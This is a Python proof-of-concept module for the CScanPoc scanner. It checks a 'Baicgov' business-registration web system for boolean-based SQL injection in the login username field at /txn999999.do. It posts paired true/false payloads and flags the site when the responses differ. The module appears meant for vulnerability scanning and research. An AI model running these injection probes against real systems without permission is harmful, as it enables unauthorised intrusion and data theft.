# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Baicgov_0101'  # 平台漏洞编号
    name = 'Baicgov工商系统SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-06-25'  # 漏洞公布时间
    desc = '''
    工商系统SQL注入漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=205941
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Baicgov'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'aad9c7dc-8b7d-40ad-afab-395c37d2f03e'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target + "/txn999999.do"
            headers = {
                "Content-Length": "93",
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Requested-With": "XMLHttpRequest",
                "Cookie": "JSESSIONID=h56kXsTbCLQyXpHpWql8yhnQXBjLXQn4fyTxKkQ9slJLYnyqnn1L!-1479162851; BIGipServerVS_DBcenter=33645472.23067.0000; publicinquiryurls=http://**.**.**.**/services/uddi/inquiryapi!IBM|http://**.**.**.**/services/uddi/v2beta/inquiryapi!IBM V2|http://**.**.**.**/inquire!Microsoft|; privateinquiryurls=1; privatepublishurls=1",
                "Connection": "Keep-alive",
                "Accept-Encoding": "gzip,deflate",
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21",
                "Accept": "*/*"
            }
            payload = "imageField=1&imageField2=2&login-page=/login.jsp&logintype=000001&password=test&username=test' AND '996'='996"
            payload1 = "imageField=1&imageField2=2&login-page=/login.jsp&logintype=000001&password=test&username=test' AND '996'='997"
            _response = requests.post(url, data=payload, headers=headers)
            _response1 = requests.post(url, data=payload1, headers=headers)
            if _response.text != _response1.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
